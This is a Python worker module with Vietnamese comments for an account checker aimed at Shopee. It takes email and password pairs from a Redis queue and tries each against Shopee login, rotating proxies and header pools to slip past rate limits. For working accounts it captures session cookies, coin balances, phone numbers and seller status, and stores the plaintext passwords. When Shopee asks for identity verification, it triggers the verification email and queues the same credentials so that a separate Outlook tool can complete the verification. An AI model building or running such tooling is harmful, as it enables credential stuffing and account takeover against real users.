import asyncio
import json
import time
from datetime import datetime, timedelta
from typing import Optional, Dict, Any
import redis.asyncio as aioredis
from pymongo import MongoClient

from checker_engine.config import (
    MONGO_URI, MONGO_DB_NAME, ACCOUNTS_COLLECTION, JOBS_COLLECTION,
    IVS_QUEUE_COLLECTION, REDIS_URL, REDIS_QUEUE_KEY, REDIS_RESULTS_CHANNEL_PREFIX,
    AccountStatus, DEFAULT_DELAY_MS
)
from checker_engine.header_pool import HeaderPoolManager
from checker_engine.proxy_manager import ProxyManager
from checker_engine.rate_limiter import RateLimiter
from checker_engine.shopee_api import (
    check_account_sync, get_account_info_sync, send_email_verify_request_sync, CheckResult
)

from checker_engine.logger import get_logger

logger = get_logger()

class CheckerWorker:
    def __init__(
        self,
        mongo_uri: str = MONGO_URI,
        redis_url: str = REDIS_URL,
        delay_ms: int = DEFAULT_DELAY_MS,
        proxy_enabled: bool = False,
        rotate_provider: Optional[str] = None,
        rotate_api_key: Optional[str] = None,
        rotate_after_n: int = 50
    ):
        self.mongo_uri = mongo_uri
        self.redis_url = redis_url
        self.delay_ms = delay_ms
        self.proxy_enabled = proxy_enabled

        self.mongo_client = None
        self.db = None
        self.redis = None

        self.header_mgr = HeaderPoolManager()
        self.proxy_mgr = ProxyManager(
            rotate_provider=rotate_provider,
            rotate_api_key=rotate_api_key,
            rotate_after_n_requests=rotate_after_n
        )
        self.rate_limiter = RateLimiter(base_delay_ms=delay_ms)
        self._running = False
        self._ivs_poll_task = None

    async def connect(self):
        """Kết nối MongoDB và Redis."""
        try:
            self.mongo_client = MongoClient(self.mongo_uri, serverSelectionTimeoutMS=5000)
            self.db = self.mongo_client[MONGO_DB_NAME]
            
            # Ensure indexes
            self.db[ACCOUNTS_COLLECTION].create_index("email", unique=True)
            self.db[ACCOUNTS_COLLECTION].create_index("status")
            self.db[ACCOUNTS_COLLECTION].create_index("job_id")
            
            # Index cho ivs_queue
            self.db[IVS_QUEUE_COLLECTION].create_index([("shopee_email", 1), ("status", 1)])
            self.db[IVS_QUEUE_COLLECTION].create_index("expires_at", expireAfterSeconds=0)

            self.redis = aioredis.from_url(self.redis_url, decode_responses=True)
            logger.info("[Worker] Kết nối MongoDB & Redis thành công.")
            return True
        except Exception as e:
            logger.error(f"[Worker] Không thể kết nối DB/Redis: {e}")
            return False

    async def disconnect(self):
        if self._ivs_poll_task:
            self._ivs_poll_task.cancel()
        if self.redis:
            await self.redis.close()
        if self.mongo_client:
            self.mongo_client.close()

    async def process_single_task(self, task: Dict[str, Any]) -> Optional[CheckResult]:
        """Xử lý check 1 account từ task dictionary."""
        job_id = task.get("job_id", "")
        email = task.get("email", "").strip()
        password_plain = task.get("password", "")
        username = task.get("username", "")

        if not email:
            return None

        # 1. Rate limiter delay
        await self.rate_limiter.acquire()

        # 2. Xoay proxy nếu đến chu kỳ
        if self.proxy_enabled:
            await self.proxy_mgr.maybe_rotate_ip()

        # 3. Lấy header & proxy
        headers, cookies, header_idx = self.header_mgr.get_next()
        proxy = self.proxy_mgr.get_proxy() if self.proxy_enabled else None

        # 4. Thực thi check API (chạy trong thread để không block asyncio loop)
        result: CheckResult = await asyncio.to_thread(
            check_account_sync,
            email=email,
            password_plain=password_plain,
            headers=headers,
            cookies=cookies,
            proxy=proxy,
            username=username,
            header_idx=header_idx
        )

        # 5. Nếu dính Rate limit hoặc Failed do IP, thử force rotate proxy
        if self.proxy_enabled and result.status in (AccountStatus.RATE_LIMIT, AccountStatus.FAILED):
            await self.proxy_mgr.force_rotate_on_error()

        # 6. Nếu LIVE và có Cookie, bóc tách số dư Shopee Xu & thông tin tài khoản
        account_info = {}
        if result.status == AccountStatus.LIVE and result.cookies:
            account_info = await asyncio.to_thread(
                get_account_info_sync,
                email=email,
                cookies=result.cookies,
                headers=headers,
                proxy=proxy
            )
            result.shopid = account_info.get("shopid")
            result.display_name = account_info.get("display_name")
            result.phone_masked = account_info.get("phone_masked")
            result.xu_balance = account_info.get("xu_balance", 0)
            result.account_level = account_info.get("account_level", 0)
            result.is_seller = account_info.get("is_seller", False)
            result.account_created_at = account_info.get("account_created_at")

        # 7. Ghi kết quả vào MongoDB
        now = datetime.now()
        doc = {
            "email": email,
            "username": username or email.split("@")[0],
            "password_plain": password_plain,
            "status": result.status.value,
            "error_code": result.error_code,
            "error_msg": result.error_msg,
            "last_checked_at": now,
            "job_id": job_id,
            "last_used_proxy": proxy,
            "last_header_pool_idx": header_idx,
            "updated_at": now
        }

        # Lưu thông tin Shopee Xu & account info nếu có
        if account_info:
            doc.update({
                "shopid": result.shopid,
                "display_name": result.display_name,
                "phone_masked": result.phone_masked,
                "xu_balance": result.xu_balance,
                "account_level": result.account_level,
                "is_seller": result.is_seller,
                "account_created_at": result.account_created_at,
                "account_info_fetched_at": now
            })

        if result.ivs_flow_no:
            doc["ivs_flow_no"] = result.ivs_flow_no
            doc["ivs_token"] = result.ivs_token

        if result.cookies:
            doc["cookies"] = result.cookies
            doc["cookie_captured_at"] = now

        try:
            self.db[ACCOUNTS_COLLECTION].update_one(
                {"email": email},
                {"$set": doc, "$setOnInsert": {"created_at": now}},
                upsert=True
            )

            # 8. Nếu rơi vào IVS_VERIFY, kích hoạt gửi email và đẩy vào hàng đợi ivs_queue
            if result.status == AccountStatus.IVS_VERIFY:
                # 8a. Tự động gọi API trigger Shopee bắn email xác minh về Outlook
                if result.ivs_token and result.ivs_flow_no:
                    logger.info(f"[{email}] 🚀 Đang gửi API trigger Shopee bắn email xác minh (dlink)...")
                    trigger_res = await asyncio.to_thread(
                        send_email_verify_request_sync,
                        v_token=result.ivs_token,
                        request_id=result.ivs_flow_no,
                        cookies=result.cookies,
                        headers=headers,
                        proxy=proxy
                    )
                    if trigger_res.get("success"):
                        logger.info(f"[{email}] ✉️ Shopee đã bắn email xác minh thành công vào Outlook.")

                ivs_doc = {
                    "shopee_email": email,
                    "outlook_email": email,
                    "password_plain": password_plain,
                    "ivs_flow_no": result.ivs_flow_no,
                    "ivs_token": result.ivs_token,
                    "shopee_login_cookies": result.cookies,
                    "status": "PENDING_VERIFY",
                    "retry_count": 0,
                    "verification_link": None,
                    "shopee_cookies_full": None,
                    "created_at": now,
                    "expires_at": now + timedelta(minutes=15),
                    "processed_at": None,
                    "completed_at": None
                }
                self.db[IVS_QUEUE_COLLECTION].update_one(
                    {"shopee_email": email},
                    {"$set": ivs_doc},
                    upsert=True
                )
                logger.info(f"[{email}] 📥 Đã đẩy task IVS vào ShopeeTool.ivs_queue cho Outlook Tool xử lý.")


            # Cập nhật stats của Job nếu có job_id
            if job_id:
                status_field = {
                    AccountStatus.LIVE.value: "live",
                    AccountStatus.IVS_VERIFY.value: "ivs_verify",
                    AccountStatus.WRONG_PASS.value: "wrong_pass",
                    AccountStatus.FAILED.value: "failed",
                    AccountStatus.BANNED.value: "failed",
                    AccountStatus.CAPTCHA.value: "captcha",
                    AccountStatus.RATE_LIMIT.value: "failed"
                }.get(result.status.value, "failed")

                self.db[JOBS_COLLECTION].update_one(
                    {"job_id": job_id},
                    {
                        "$inc": {"processed": 1, status_field: 1, "pending": -1},
                        "$set": {"updated_at": now}
                    }
                )
        except Exception as e:
            logger.error(f"[Worker] Lỗi khi lưu MongoDB: {e}")

        # 9. Bắn thông điệp WebSocket qua Redis Pub/Sub
        if self.redis and job_id:
            channel = f"{REDIS_RESULTS_CHANNEL_PREFIX}:{job_id}"
            message = {
                "type": "account_result",
                "data": {
                    "email": email,
                    "username": username,
                    "status": result.status.value,
                    "error_code": result.error_code,
                    "error_msg": result.error_msg,
                    "elapsed_ms": result.elapsed_ms,
                    "has_cookies": bool(result.cookies),
                    "xu_balance": result.xu_balance,
                    "display_name": result.display_name,
                    "phone_masked": result.phone_masked,
                    "checked_at": now.strftime("%Y-%m-%d %H:%M:%S")
                }
            }
            try:
                await self.redis.publish(channel, json.dumps(message))
            except Exception as e:
                logger.debug(f"[Worker] Lỗi khi publish Redis: {e}")

        return result

    async def poll_ivs_completions(self):
        """Chạy ngầm định kỳ: Lấy kết quả từ ivs_queue đã VERIFIED → cập nhật accounts thành LIVE."""
        logger.info("[Worker] Bắt đầu background IVS completion poller...")
        while self._running:
            try:
                if self.db is not None:
                    completed_tasks = list(self.db[IVS_QUEUE_COLLECTION].find({
                        "status": "VERIFIED",
                        "shopee_cookies_full": {"$ne": None}
                    }))
                    now = datetime.now()
                    for task in completed_tasks:
                        email = task.get("shopee_email")
                        full_cookies = task.get("shopee_cookies_full")
                        if email and full_cookies:
                            self.db[ACCOUNTS_COLLECTION].update_one(
                                {"email": email},
                                {"$set": {
                                    "status": AccountStatus.LIVE.value,
                                    "cookies": full_cookies,
                                    "ivs_resolved": True,
                                    "cookie_captured_at": now,
                                    "updated_at": now
                                }}
                            )
                            # Xóa khỏi ivs_queue sau khi update thành công
                            self.db[IVS_QUEUE_COLLECTION].delete_one({"_id": task["_id"]})
                            logger.info(f"[{email}] 🟢 IVS RESOLVED → Tài khoản đã được nâng cấp lên LIVE với full Cookie!")
            except Exception as e:
                logger.error(f"[Worker] Lỗi trong ivs poller: {e}")
            
            await asyncio.sleep(15)

    async def run_queue_worker(self, worker_id: int = 1):
        """Worker loop liên tục kéo task từ Redis Queue."""
        self._running = True
        logger.info(f"[Worker #{worker_id}] Bắt đầu lắng nghe hàng đợi...")

        # Khởi chạy poller IVS completion chạy nền
        if not self._ivs_poll_task:
            self._ivs_poll_task = asyncio.create_task(self.poll_ivs_completions())

        while self._running:
            try:
                # BRPOP timeout 2 giây
                item = await self.redis.brpop(REDIS_QUEUE_KEY, timeout=2)
                if item:
                    _, task_json = item
                    task = json.loads(task_json)
                    await self.process_single_task(task)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[Worker #{worker_id}] Lỗi vòng lặp worker: {e}")
                await asyncio.sleep(1)

        logger.info(f"[Worker #{worker_id}] Đã dừng.")

    def stop(self):
        self._running = False

